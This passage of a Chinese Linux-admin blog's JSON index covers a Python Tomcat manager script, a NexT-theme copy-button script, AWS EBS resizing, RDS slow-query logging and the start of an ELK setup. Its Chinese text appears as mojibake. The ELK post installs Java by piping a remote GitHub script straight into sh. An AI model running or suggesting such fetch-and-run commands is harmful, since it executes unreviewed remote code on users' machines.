self.config_app_port() self.config_app_manage_shell() self.manage(\"upgrade\") self.manage(\"stop\") def restart(self): self.manage(\"stop\") self.manage(\"start\") def start(self): self.manage(\"start\") def stop(self): self.manage(\"stop\") def log(self): self.manage(\"log\") def upgrade(self): self.lock_config_file() self.manage(\"upgrade\") def lock_config_file(self): cmd = 'find ' + self.webapp_dir + ' -name db*properties -o -name config_base_*|xargs chattr +i &gt;/dev/null 2&gt;&amp;1' customize_print(\"é”é…ç½®æ–‡ä»¶\", 2) os.system(cmd) def unlock_config_file(self): cmd = 'find ' + self.webapp_dir + ' -name db*properties -o -name config_base_*|xargs chattr -i &gt;/dev/null 2&gt;&amp;1' customize_print(\"è§£é”é…ç½®æ–‡ä»¶\", 2) os.system(cmd)def dash_board(apps, operate): \"\"\" ä¸»ç®¡ç†ç¨‹åºï¼Œè°ƒç”¨ :param operate: åº”ç”¨æ“ä½œ :param apps: apps ä¸ºlist \"\"\" for app in apps: app_obj = TomcatAppsManage(app) main_dict = &#123; \"init\": app_obj.init, \"shell\": app_obj.config_app_manage_shell, \"status\": app_obj.status_app, \"start\": app_obj.start, \"stop\": app_obj.stop, \"restart\": app_obj.restart, \"upgrade\": app_obj.upgrade, \"log\": app_obj.log, \"lock\": app_obj.lock_config_file, \"unlock\": app_obj.unlock_config_file, &#125; try: main_dict[operate]() except KeyError as e: customize_print(help_msg)help_msg = \"\"\"ä½¿ç”¨æ–¹æ³•ï¼š 1 log all status ç®¡ç†åº”ç”¨ç¼–å· æ“ä½œæ“ä½œï¼š lock é”é…ç½®æ–‡ä»¶ unlock è§£é”é…ç½®æ–‡ä»¶ init é…ç½®tomcatç›‘å¬ç«¯å£ shell é…ç½®webappæ§åˆ¶è„šæœ¬ statusï¼Œstartï¼Œrestart, logï¼Œupgradeï¼Œstop åº”ç”¨æ“ä½œ\"\"\"def main(): app_list = [] for index, app_name in enumerate(config_data, 1): print \"\\033[94m %s: %s \\033[0m\" % (index, app_name) app_list.append(app_name) choice = raw_input(\"è¾“å…¥è¦ç®¡ç†çš„æœåŠ¡: \") try: app_index = choice.split()[0] operate = choice.split()[1] if app_index.isdigit(): app_index = int(app_index) if len(app_list) &gt;= app_index &gt; 0: app_name = app_list[app_index - 1] dash_board(app_name.split(), operate) elif app_index == \"all\": dash_board(app_list, operate) except ValueError and IndexError: customize_print(\"å‚æ•°è¾“å…¥é”™è¯¯\", 1) customize_print(help_msg)if __name__ == '__main__': try: dash_board(sys.argv[1].split(), sys.argv[2]) except IndexError: try: while True: main() except KeyboardInterrupt: customize_print(\"Bye!\") 0x02 å¼€å§‹åˆå§‹åŒ–éƒ¨ç½²æ‰§è¡Œtomcat_manager all init è‡ªåŠ¨åˆå§‹åŒ–éƒ¨ç½²æ‰€æœ‰é¡¹ç›®, å…¶ä»–å…·ä½“ä½¿ç”¨æ–¹æ³•è§å¸®åŠ©ä¿¡æ¯","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"https://kionf.com/categories/Linux/"},{"name":"Tomcat","slug":"Linux/Tomcat","permalink":"https://kionf.com/categories/Linux/Tomcat/"}],"tags":[{"name":"Tomcat","slug":"Tomcat","permalink":"https://kionf.com/tags/Tomcat/"}]},{"title":"hexo nextä»£ç ç‰‡æ®µæ·»åŠ ä»£ç å—å¤åˆ¶å’Œé•¿ä»£ç è‡ªåŠ¨å±•å¼€","slug":"blog-next","date":"2018-06-27T16:00:00.000Z","updated":"2018-10-31T10:19:28.287Z","comments":true,"path":"2018/06/28/blog-next/","link":"","permalink":"https://kionf.com/2018/06/28/blog-next/","excerpt":"\næ·»åŠ é¼ æ ‡ç§»åŠ¨åˆ°é•¿ä»£ç å—, è‡ªåŠ¨å±•å¼€.  ä»£ç å—å¤åˆ¶æŒ‰é’®åŠå®šåˆ¶\n","text":"æ·»åŠ é¼ æ ‡ç§»åŠ¨åˆ°é•¿ä»£ç å—, è‡ªåŠ¨å±•å¼€. ä»£ç å—å¤åˆ¶æŒ‰é’®åŠå®šåˆ¶ 0x00 æ·»åŠ ç¬¬ä¸‰æ–¹jsæ’ä»¶clipboard.js ä¸‹è½½ ./themes/next/source/lib/zclip/clipboard.min.js æ–°å¢ 0x01 æ’å…¥è‡ªå®šä¹‰javascriptæ–°å¢custom.jsæ–‡ä»¶, ç›®å½•å¦‚ä¸‹ ./themes/next/source/js/src/custom.js æ–°å¢ ./themes/next/source/js/src/custom.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246var browserHeight = document.documentElement.clientHeight || document.body.clientHeight;var scrollTop = document.documentElement.scrollTop || document.body.scrollTop;function createCopyBtns() &#123; // åˆ›å»ºå¤åˆ¶button å¯¹è±¡ var $figure = $(\"figure .figcode\"); if ($figure.length &gt; 0) &#123; $(\".post-body\").before('&lt;div id=\"copyBtn\" &gt;&lt;span id=\"imgCopy\" &gt;&lt;i class=\"fa fa-paste fa-fw\"&gt;&lt;/i&gt;&lt;/span&gt;&lt;span id=\"imgSuccess\" style=\"display: none;color: #6FB76F;\"&gt;&lt;i class=\"fa fa-check-circle fa-fw\" aria-hidden=\"true\"&gt;&lt;/i&gt;&lt;/span&gt;'); $figure.append('&lt;div class=\"codePinBtn\"&gt;&lt;img id=\"imgSuccess\" src=\"/article_images/png/Pin_green.png\" style=\"border:none; width: 24px;\"&gt;&lt;/div&gt;'); &#125; var $codeArea = $(\"figure .code\"); if ($codeArea.length &gt; 0) &#123; function changeToSuccess(item) &#123; $imgOK = $(\"#copyBtn\").find(\"#imgSuccess\"); if ($imgOK.css(\"display\") == \"none\") &#123; $imgOK.css(&#123; opacity: 0, display: \"block\" &#125;); $imgOK.animate(&#123; opacity: 1 &#125;, 1000); setTimeout(function () &#123; $imgOK.animate(&#123; opacity: 0 &#125;, 2000); &#125;, 2000); setTimeout(function () &#123; $imgOK.css(\"display\", \"none\"); &#125;, 4000); &#125; ; &#125;; var clipboard = new ClipboardJS('#copyBtn', &#123; // å®šåˆ¶ç­›é€‰å¤åˆ¶ target: function () &#123; var node = document.querySelector(\"[copyFlag]\"); var child = node.querySelector(\".diff-deletion\"); if (child != null) &#123; var pre = node.querySelector(\"pre\").cloneNode(true); child = pre.querySelector(\".diff-deletion\"); while (child != null) &#123; pre.removeChild(child) child = pre.querySelector(\".diff-deletion\"); &#125; var node = document.getElementById('tmpcopy'); if (node == null) &#123; node = document.createElement('div'); node.id = 'tmpcopy'; node.style.position = 'fixed'; node.style.width = '0'; node.style.height = '0'; document.body.appendChild(node); &#125; node.innerHTML = ''; node.appendChild(pre); &#125; return node; &#125;, isSupported: function () &#123; alert(this.support); return document.querySelector(\"[copyFlag]\"); &#125; &#125;); clipboard.on('success', function (e) &#123; e.clearSelection(); changeToSuccess(e); var node = document.getElementById(\"tmpcopy\"); if (node != null) node.innerHTML = ''; &#125;); clipboard.on('error', function (e) &#123; console.error('Action:', e.action); console.error('Trigger:', e.trigger); &#125;); $(\"#copyBtn\").hover( function () &#123; $(this).stop(); $(this).css(\"opacity\", 1); &#125;, function () &#123; $(this).animate(&#123; opacity: 0 &#125;, 2000); &#125; ); &#125;&#125;function FigureHover(figure) &#123; // ç§»åŠ¨é¼ æ ‡æ‹‰ä¼¸æ˜¾ç¤ºä»£ç  var block = $(figure).attr(\"block\"); if (block != 1) &#123; var codeArea = $(figure).find(\".code\")[0]; var width_code = codeArea.clientWidth; var width_Scroll = codeArea.scrollWidth; var width_Margin = -parseInt($(figure).css(\"marginRight\")); $codePinBtn = $(figure).find(\".codePinBtn\"); var width_Hide = width_Scroll - (width_code - width_Margin); if (width_Hide &gt; 0) &#123; $(figure).stop(); $codePinBtn.stop(); var width_Main = $(\"#main\").width(); var width_Base = $(\".main-inner\").width(); var width_Blank = (width_Main - width_Base) / 2 - 10; if (width_Blank &gt; 0) &#123; if (width_Hide &lt; width_Blank) &#123; width_Margin = width_Hide; //ç©ºç™½åŒºåŸŸè¶³å¤Ÿç›´æ¥æ˜¾ç¤º å…¨éƒ¨ &#125; else &#123; width_Margin = width_Blank * 0.8; &#125; $(figure).animate(&#123;marginRight: -width_Margin&#125;); $codePinBtn.animate(&#123;opacity: 1&#125;); &#125; &#125; ; &#125; ;&#125;;function FigureHoverOut(figure) &#123; // é¼ æ ‡ç§»é™¤ä»£ç å— $(\"#copyBtn\").animate(&#123; opacity: 0 &#125;, 2000); var block = $(figure).attr(\"block\"); if (block != 1) &#123; $(figure).stop(); $(figure).animate(&#123;marginRight: \"0\"&#125;); var $codePinBtn = $(figure).find(\".codePinBtn\"); $codePinBtn.stop(); $codePinBtn.css(&#123;opacity: 0&#125;); &#125;&#125;;$(\"figure\").hover( // é¼ æ ‡ç§»å…¥ä»£ç å— function () &#123; FigureHover(this); var block = $(this).attr(\"block\"); //-------é¼ æ ‡æ´»åŠ¨åœ¨ä»£ç å—å†… //ç§»é™¤ä¹‹å‰å«æœ‰å¤åˆ¶æ ‡å¿—ä»£ç å—çš„ copyFlag $(\"[copyFlag]\").removeAttr(\"copyFlag\"); //åœ¨æ–°çš„ï¼ˆå½“å‰é¼ æ ‡æ‰€åœ¨ä»£ç åŒºï¼‰ä»£ç å—æ’å…¥æ ‡å¿—ï¼šcopyFlag $(this).find(\".code\").attr(\"copyFlag\", 1); //è·å–å¤åˆ¶æŒ‰é’® $copyBtn = $(\"#copyBtn\"); if ($copyBtn.lenght != 0) &#123; //è·å–åˆ°æŒ‰é’®çš„å‰æä¸‹è¿›è¡Œä¸€ä¸‹æ“ä½œ //åœæ­¢æŒ‰é’®åŠ¨ç”»æ•ˆæœ //è®¾ç½®ä¸º æ˜¾ç¤ºçŠ¶æ€ //ä¿®æ”¹ å¤åˆ¶æŒ‰é’® ä½ç½®åˆ° å½“å‰ä»£ç å—å¼€å§‹éƒ¨ä½ //è®¾ç½®ä»£ç å— å·¦ä¾§ä½ç½® $copyBtn.stop(); $copyBtn.css(\"opacity\", 0.8); $copyBtn.css(\"display\", \"block\"); $copyBtn.css(\"top\", parseInt($copyBtn.css(\"top\")) + $(this).offset().top - $copyBtn.offset().top + 3); $copyBtn.css(\"left\", -$copyBtn.width() - 3); &#125; &#125;, function () &#123; FigureHoverOut(this); &#125;,);function btnPinClick() &#123; var figure = this.parentElement.parentElement; var block = $(figure).attr(\"block\"); if (block != 1) &#123; $(\".post-body\").css(\"transform\", \"none\"); $(figure).attr(\"block\", 1); $(this).find(\"img\").attr(\"src\", \"/article_images/png/Pin_red.png\"); &#125; else &#123; $(figure).attr(\"block\", 0); $(this).find(\"img\").attr(\"src\", \"/article_images/png/Pin_green.png\"); &#125;&#125;$(\"figure\").unbind(\"dblclick\").bind(\"dblclick\", function () &#123; //åŒå‡»äº‹ä»¶ var block = $(this).attr(\"block\"); if (block != 1) &#123; $(\".post-body\").css(\"transform\", \"none\"); $(this).attr(\"block\", 1); $(this).find(\".codePinBtn img\").attr(\"src\", \"/article_images/png/Pin_red.png\"); &#125; else &#123; $(this).attr(\"block\", 0); $(this).find(\".codePinBtn img\").attr(\"src\", \"/article_images/png/Pin_green.png\"); &#125;&#125;)$(window).resize(function () &#123; var block; var width_Main = $(\"#main\").width(); var width_Base = $(\".main-inner\").width(); var width_Blank = (width_Main - width_Base) / 2 - 10; $copyBtn = $(\"#copyBtn\"); if (width_Blank &lt; $copyBtn.width()) &#123; $copyBtn.css(\"display\", \"none\"); &#125; else &#123; $copyBtn.css(\"display\", \"block\"); &#125; $(\"figure[block='1']\").each(function () &#123; block = $(this).attr(\"block\"); if (block == 1) &#123; var width_This = $(this).width(); var width_Scroll = $(this)[0].scrollWidth; var width_Margin = -parseInt($(this).css(\"marginRight\")); var width_Hide = width_Scroll - (width_This - width_Margin); if (width_Hide &gt; 0) &#123; //var width_Main = $(\"#main\").width(); //var width_Base = $(\".main-inner\").width(); //width_Blank = (width_Main - width_Base) / 2 - 10; if (width_Blank &gt; 0) &#123; if (width_Hide &lt; width_Blank) &#123; width_Margin = width_Hide; //ç©ºç™½åŒºåŸŸè¶³å¤Ÿç›´æ¥æ˜¾ç¤º å…¨éƒ¨ &#125; else &#123; width_Margin = width_Blank * 0.8; &#125; $(this).css(&#123; marginRight: -width_Margin &#125;); $(this).find(\".codePinBtn\").animate(&#123; opacity: 1, left: $(\".post-body\")[0].getBoundingClientRect().right + width_Margin - $(this).find(\".codePinBtn\").width() &#125;); &#125; &#125; &#125; &#125;);&#125;);$(document).ready(function () &#123; createCopyBtns(); $(\".codePinBtn\").unbind(\"click\").bind(\"click\", btnPinClick);&#125;); 0x02 æ·»åŠ è‡ªåŠ¨æ”¹å˜ä»£ç ç‰‡æ®µjs ./themes/next/source/js/src/function.js æ–°å¢ ./themes/next/source/js/src/function.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980function getClass(tagName, className) //è·å¾—æ ‡ç­¾åä¸ºtagName,ç±»åclassNameçš„å…ƒç´ &#123; if (document.getElementsByClassName) //æ”¯æŒè¿™ä¸ªå‡½æ•° &#123; return document.getElementsByClassName(className); &#125; else &#123; var tags = document.getElementsByTagName(tagName); //è·å–æ ‡ç­¾ var tagArr = []; //ç”¨äºè¿”å›ç±»åä¸ºclassNameçš„å…ƒç´  for (var i = 0; i &lt; tags.length; i++) &#123; if (tags[i].class == className) &#123; tagArr[tagArr.length] = tags[i]; //ä¿å­˜æ»¡è¶³æ¡ä»¶çš„å…ƒç´  &#125; &#125; return tagArr; &#125;&#125;function addEvent(obj, type, fn) &#123; if (obj.addEventListener) obj.addEventListener(type, fn, false); else if (obj.attachEvent) obj.attachEvent('on' + type, fn); else obj['on' + type] = fn;&#125;function removeEvent(obj, type, fn) &#123; if (obj.removeEventListener) obj.removeEventListener(type, fn, false); else if (obj.detachEvent) obj.detachEvent('on' + type, fn); else obj['on' + type] = null;&#125;;function resizePos(obj, callback) &#123; if (typeof callback == \"function\") &#123; addEvent(window, 'scroll', function() &#123; callback(obj); &#125;); addEvent(window, 'resize', function() &#123; callback(obj); &#125;); &#125;&#125;function getBrowser(getVersion) &#123; //æ³¨æ„å…³é”®å­—å¤§å°å†™ var ua_str = navigator.userAgent.toLowerCase(), ie_Tridents, trident, match_str, ie_aer_rv, browser_chi_Type; //åˆ¤æ–­IE æµè§ˆå™¨, //blog: http://blog.csdn.Net/aerchi/article/details/51697592 if (\"ActiveXObject\" in self) &#123; // ie_aer_rv: æŒ‡ç¤ºIE çš„ç‰ˆæœ¬. // It can be affected by the current document mode of IE. ie_aer_rv = (match_str = ua_str.match(/msie ([\\d.]+)/)) ? match_str[1] : (match_str = ua_str.match(/rv:([\\d.]+)/)) ? match_str[1] : 0; // ie: Indicate the really version of current IE browser. ie_Tridents = &#123; \"trident/7.0\": 11, \"trident/6.0\": 10, \"trident/5.0\": 9, \"trident/4.0\": 8 &#125;; //åŒ¹é… ie8, ie11, edge trident = (match_str = ua_str.match(/(trident\\/[\\d.]+|edge\\/[\\d.]+)/)) ? match_str[1] : undefined; browser_chi_Type = (ie_Tridents[trident] || ie_aer_rv) &gt; 0 ? \"internet-explorer\" : undefined; &#125; else &#123; //åˆ¤æ–­ windows edge æµè§ˆå™¨ // match_str[1]: è¿”å›æµè§ˆå™¨åŠç‰ˆæœ¬å·,å¦‚: \"edge/13.10586\" // match_str[1]: è¿”å›ç‰ˆæœ¬å·,å¦‚: \"edge\" //è‹¥è¦è¿”å› \"edge\" è¯·æŠŠä¸‹è¡Œçš„ \"ie\" æ¢æˆ \"edge\"ã€‚ æ³¨æ„å¼•å·åŠå†’å·æ˜¯è‹±æ–‡çŠ¶æ€ä¸‹è¾“å…¥çš„ browser_chi_Type = (match_str = ua_str.match(/edge\\/([\\d.]+)/)) ? \"edge\" : //åˆ¤æ–­firefox æµè§ˆå™¨ (match_str = ua_str.match(/firefox\\/([\\d.]+)/)) ? \"firefox\" : //åˆ¤æ–­chrome æµè§ˆå™¨ (match_str = ua_str.match(/chrome\\/([\\d.]+)/)) ? \"chrome\" : //åˆ¤æ–­opera æµè§ˆå™¨ (match_str = ua_str.match(/opera.([\\d.]+)/)) ? \"opera\" : //åˆ¤æ–­safari æµè§ˆå™¨ (match_str = ua_str.match(/version\\/([\\d.]+).*safari/)) ? \"safari\" : undefined; &#125; //è¿”å›æµè§ˆå™¨ç±»å‹å’Œç‰ˆæœ¬å· var verNum, verStr; verNum = trident &amp;&amp; ie_Tridents[trident] ? ie_Tridents[trident] : match_str[1]; verStr = (getVersion != undefined) ? browser_chi_Type + \"/\" + verNum : browser_chi_Type; return verStr;&#125; 0x03 æ’å…¥åˆ°ä¸»é¢˜æ–°å»ºæ–‡ä»¶ custom.swig ï¼Œç›®å½•å¦‚ä¸‹ï¼šï¼ˆç›¸å¯¹ç›®å½•ä¸ºå·¥ç¨‹ç›®å½•ï¼‰ ./themes/next/layout_custom/custom.swig æ–°å¢ 123&lt;script type=\"text/javascript\" src=\"/js/src/function.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"/lib/zclip/clipboard.min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"/js/src/custom.js\"&gt;&lt;/script&gt; ä¿®æ”¹æ–‡ä»¶ _layout.swig ï¼Œç›®å½•å¦‚ä¸‹ï¼šï¼ˆç›¸å¯¹ç›®å½•ä¸ºå·¥ç¨‹ç›®å½•ï¼‰ ./themes/next/layout/_layout.swig ä¿®æ”¹ ./themes/next/layout/_layout.swig&lt;!doctype html&gt;...&lt;html class=\"&#123;&#123; html_class | lower &#125;&#125;\" lang=\"&#123;&#123; config.language &#125;&#125;\"&gt;&lt;head&gt;...&lt;/head&gt;&lt;body itemscope itemtype=\"http://schema.org/WebPage\" lang=\"&#123;&#123; page.lang || page.language || config.language &#125;&#125;\"&gt; ... ... &#123;% include '_third-party/mathjax.swig' %&#125; &#123;% include '_third-party/scroll-cookie.swig' %&#125; &#123;% include '_third-party/exturl.swig' %&#125; &#123;% include '_custom/custom.swig' %&#125;&lt;/body&gt;&lt;/html&gt; 0x04 æ›´æ”¹button ./themes/next/source/css/_custom/button.styl æ–°å¢ 1234567891011121314151617.codePinBtn&#123; flex: 0 0 auto; opacity: 0; z-index: 1000; margin-left: -23px; align-self: start;&#125;#copyBtn &#123; opacity: 0; position: fixed; display: block; z-index: 1000; line-height: 1; font-size: 1.5em; left: 18px;&#125; ./themes/next/source/css/_custom/custom.styl ä¿®æ”¹ ...@import button; æ·»åŠ ä»£ç æ‹‰ä¼¸æ§åˆ¶buttonæ–‡ä»¶ å‰©ä¸‹çš„è‡ªå·±é¼“æ£ ç¥å™¨","raw":null,"content":null,"categories":[{"name":"note","slug":"note","permalink":"https://kionf.com/categories/note/"}],"tags":[{"name":"blog","slug":"blog","permalink":"https://kionf.com/tags/blog/"},{"name":"next","slug":"next","permalink":"https://kionf.com/tags/next/"}]},{"title":"AWS EC2 ç£ç›˜EBSæ‰©å®¹","slug":"linux-aws-ebs","date":"2017-11-14T16:00:00.000Z","updated":"2018-10-31T10:19:28.299Z","comments":true,"path":"2017/11/15/linux-aws-ebs/","link":"","permalink":"https://kionf.com/2017/11/15/linux-aws-ebs/","excerpt":"5minä¸åœæœºæ‰©å®¹EBSå·å¤§å°\n","text":"5minä¸åœæœºæ‰©å®¹EBSå·å¤§å° 0x00 å¢åŠ ç£ç›˜å¤§å°1. åœ¨ec2å®ä¾‹ç•Œé¢é€‰æ‹©ç›¸åº”éœ€è¦æ‰©å®¹ç£ç›˜çš„å®ä¾‹ï¼Œé€‰æ‹©è¦æ‰©å®¹çš„ç£ç›˜ 2. ä¿®æ”¹å·å¤§å° 3. ç¡®è®¤æ˜¾ç¤ºè¿›åº¦ï¼Œç­‰å¾…åº”ç”¨é…ç½®å®Œæˆï¼Œéœ€è¦å‡ åˆ†é’Ÿè€å¿ƒç­‰å¾…â€¦. 0x01 æ‰©å®¹ç£ç›˜å®‰è£…æ‰©å®¹å·¥å…· 1yum install cloud-init cloud-utils-growpart gdisk ç­‰å¾…ebså·å¤§å°è°ƒæ•´å®Œæˆåï¼Œåœ¨æ‰©å®¹çš„å®ä¾‹ä¸­æ‰§è¡Œlsblkåˆ—å‡ºè¿æ¥åˆ°å®ä¾‹çš„EBSè®¾å¤‡ 1234[root@ttt] #: lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTxvda 202:0 0 6000G 0 disk â””â”€xvda1 202:1 0 20G 0 part / ä½¿ç”¨ df -h æŸ¥çœ‹ï¼Œ/dev/xvda1 è®¾å¤‡å·²æ‰©å±•ä¸º 6000 GiBï¼Œä½†æ“ä½œç³»ç»Ÿä»åªèƒ½çœ‹åˆ°åŸæ¥çš„ 20 GiB ext4 æ–‡ä»¶ç³»ç»Ÿ 12345[root@ttt] #: df -hæ–‡ä»¶ç³»ç»Ÿ å®¹é‡ å·²ç”¨ å¯ç”¨ å·²ç”¨% æŒ‚è½½ç‚¹devtmpfs 3.9G 64K 3.9G 1% /devtmpfs 3.9G 0 3.9G 0% /dev/shm/dev/xvda1 20G 12G 8.2G 59% / æ¥ä¸‹æ¥ä½¿ç”¨growpartå±•å¼€ä¿®æ”¹åçš„åˆ†åŒºï¼ˆæ³¨æ„å°†è®¾å¤‡åç§°ä¸åˆ†åŒºåç§°åˆ†éš”å¼€ï¼‰ 12[root@ttt] #: growpart /dev/xvda 1CHANGED: disk=/dev/xvda partition=1: start=4096 old: size=41938910,end=41943006 new: size=104853470,end=104857566 é€šè¿‡æŸ¥çœ‹lsblkå¯ä»¥ç¡®è®¤åˆ†åŒº/dev/xvda1ç°å·²å¡«å……å·/dev/xvdaä¸Šçš„å¯ç”¨ç©ºé—´ï¼š 1234[root@ttt] #: lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTxvda 202:0 0 6000G 0 disk â””â”€xvda1 202:1 0 6000G 0 part / å¯¹äº Linux ext2ã€ext3 æˆ– ext4 æ–‡ä»¶ç³»ç»Ÿï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¹¶æ›¿æ¢è¦æ‰©å±•çš„è®¾å¤‡åç§°ï¼š 12345[root@ttt] #: resize2fs /dev/xvda1resize2fs 1.42.12 (29-Aug-2014)Filesystem at /dev/xvda1 is mounted on /; on-line resizing requiredold_desc_blocks = 2, new_desc_blocks = 4The filesystem on /dev/xvda1 is now 13106683 (4k) blocks long. 0x02 å®Œæˆæ‰©å®¹è‡³æ­¤ï¼Œç£ç›˜å·²å®Œæˆæ‰©å®¹ï¼ŒæŸ¥çœ‹ç£ç›˜å¯ç”¨ç©ºé—´ï¼š 12345[root@ttt] #: df -hæ–‡ä»¶ç³»ç»Ÿ å®¹é‡ å·²ç”¨ å¯ç”¨ å·²ç”¨% æŒ‚è½½ç‚¹devtmpfs 3.9G 64K 3.9G 1% /devtmpfs 3.9G 0 3.9G 0% /dev/shm/dev/xvda1 6000G 12G 5988.2G 0.002% /","raw":null,"content":null,"categories":[{"name":"è‡ªåŠ¨åŒ–è¿ç»´","slug":"è‡ªåŠ¨åŒ–è¿ç»´","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/"},{"name":"AWS","slug":"è‡ªåŠ¨åŒ–è¿ç»´/AWS","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/AWS/"}],"tags":[{"name":"AWS","slug":"AWS","permalink":"https://kionf.com/tags/AWS/"}]},{"title":"awsä¸ŠRDSæ•°æ®åº“å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—","slug":"mysql-slowlog","date":"2017-11-07T16:00:00.000Z","updated":"2018-10-31T10:19:28.315Z","comments":true,"path":"2017/11/08/mysql-slowlog/","link":"","permalink":"https://kionf.com/2017/11/08/mysql-slowlog/","excerpt":"mysqlæ•°æ®åº“å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—å’ŒæŸ¥è¯¢ä¸­æ²¡ç´¢å¼•çš„è¯­å¥ã€‚ä¾›åˆ†æ\n","text":"mysqlæ•°æ®åº“å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—å’ŒæŸ¥è¯¢ä¸­æ²¡ç´¢å¼•çš„è¯­å¥ã€‚ä¾›åˆ†æ 0x00å‚æ•°é¦–å…ˆé€‰æ‹©RDSæœåŠ¡&gt;å‚æ•°ç»„é€‰æ‹©éœ€è¦æ›´æ”¹çš„å‚æ•°ç»„æ›´æ”¹å¦‚ä¸‹å‚æ•°: 123456789101112- slow_query_logï¼šè¦åˆ›å»ºæ…¢é€ŸæŸ¥è¯¢æ—¥å¿—ï¼Œè¯·è®¾ç½®ä¸º 1ã€‚é»˜è®¤å€¼ä¸º 0ã€‚- general_logï¼šè¦åˆ›å»ºä¸€èˆ¬æ—¥å¿—ï¼Œè¯·è®¾ç½®ä¸º 1ã€‚é»˜è®¤å€¼ä¸º 0ã€‚- long_query_timeï¼šåªè®°å½•æŸ¥è¯¢æ—¶é—´è¶…è¿‡åˆ¶å®šæ—¶é—´çš„sqlã€‚ä¾‹long_query_time=0.5åªè®°å½•æŸ¥è¯¢æ—¶é—´è¶…è¿‡500æ¯«ç§’çš„sqlã€‚- log_queries_not_using_indexesï¼šè¦å°†æ‰€æœ‰ä¸ä½¿ç”¨ç´¢å¼•çš„æŸ¥è¯¢è®°å½•åˆ°æ…¢é€ŸæŸ¥è¯¢æ—¥å¿—ï¼Œè¯·è®¾ç½®ä¸º 1ã€‚é»˜è®¤å€¼ä¸º 0ã€‚å³ä½¿æŸ¥è¯¢çš„æ‰§è¡Œæ—¶é—´å°äº long_query_time å‚æ•°å€¼ï¼Œåªè¦å®ƒä»¬ä¸ä½¿ç”¨ç´¢å¼•ï¼Œå°±ä¼šè¢«ç³»ç»Ÿè®°å½•ã€‚- log_outputï¼šæ‚¨å¯ä¸º log_output å‚æ•°æŒ‡å®šä¸‹åˆ—é€‰é¡¹ä¹‹ä¸€ã€‚ TABLE (é»˜è®¤) â€“ å°†ä¸€èˆ¬æŸ¥è¯¢å†™å…¥ mysql.general_log è¡¨ï¼Œå°†æ…¢é€ŸæŸ¥è¯¢å†™å…¥ mysql.slow_log è¡¨ã€‚ FILE (æ¨è) â€“ å°†ä¸€èˆ¬æŸ¥è¯¢æ—¥å¿—å’Œæ…¢é€ŸæŸ¥è¯¢æ—¥å¿—å†™å…¥æ–‡ä»¶ç³»ç»Ÿã€‚æ—¥å¿—æ–‡ä»¶æ¯å°æ—¶è½®æ¢ä¸€æ¬¡ã€‚ NONEâ€“ ç¦ç”¨æ—¥å¿—è®°å½•ã€‚ å¯ç”¨äº†æ—¥å¿—è®°å½•æ—¶ï¼ŒAmazon RDS ä¼šå®šæœŸè½®æ¢è¡¨æ—¥å¿—æˆ–åˆ é™¤æ—¥å¿—æ–‡ä»¶ï¼Œlog_outputä¸ºTABLEæ—¶å¦‚éœ€æ‰‹åŠ¨è½®æ¢æ‰§è¡Œï¼š 12PROMPT&gt; CALL mysql.rds_rotate_slow_log;PROMPT&gt; CALL mysql.rds_rotate_general_log; log_outputä¸ºFILEæ—¶ä¼šæ¯å°æ—¶æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¹¶åˆ é™¤ 24 å°æ—¶ä¹‹å‰çš„æ—¥å¿—æ–‡ä»¶ã€‚ 0x01å®é™…åº”ç”¨å‚æ•°12345slow_query_log=1general_log=1long_query_time=0.5log_queries_not_using_indexes=1log_output=FILE","raw":null,"content":null,"categories":[{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://kionf.com/categories/æ•°æ®åº“/"},{"name":"Mysql","slug":"æ•°æ®åº“/Mysql","permalink":"https://kionf.com/categories/æ•°æ®åº“/Mysql/"}],"tags":[{"name":"AWS","slug":"AWS","permalink":"https://kionf.com/tags/AWS/"},{"name":"Mysql","slug":"Mysql","permalink":"https://kionf.com/tags/Mysql/"}]},{"title":"log4j-1.2 + ELKéƒ¨ç½²","slug":"elk-deploy","date":"2017-09-17T16:00:00.000Z","updated":"2018-11-21T02:37:36.831Z","comments":true,"path":"2017/09/18/elk-deploy/","link":"","permalink":"https://kionf.com/2017/09/18/elk-deploy/","excerpt":"\nlog4j-1.2 + logstash-5.0.1 + elasticsearch-5.6.0 + kibana-5.6.0\n","text":"log4j-1.2 + logstash-5.0.1 + elasticsearch-5.6.0 + kibana-5.6.0 0x00 ä¸‹è½½ELKä¸‹è½½ ï¼š 1) logstash-5.0.12) kibana-5.6.03) elasticsearch-5.6.04) å®‰è£…jdk1.8 curl https://raw.githubusercontent.com/kalivim/Linux_shell/master/jdk-1.8.112.sh|sh ä¸‹è½½å®Œæˆåè§£å‹ç›¸åº”æ–‡ä»¶,è„šæœ¬å®‰è£…jdkåœ¨/data/software/ä¸‹ 123export JAVA_HOME=/data/jdk1.8.0_112export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar 0x01 é…ç½®log4jé¦–å…ˆé…ç½®ç¨‹åºlog4jé…ç½®æ–‡ä»¶log4j.properties,æ·»åŠ å¦‚ä¸‹é…ç½® 1234567891011#åœ¨rootLoggerä¸­æ·»åŠ 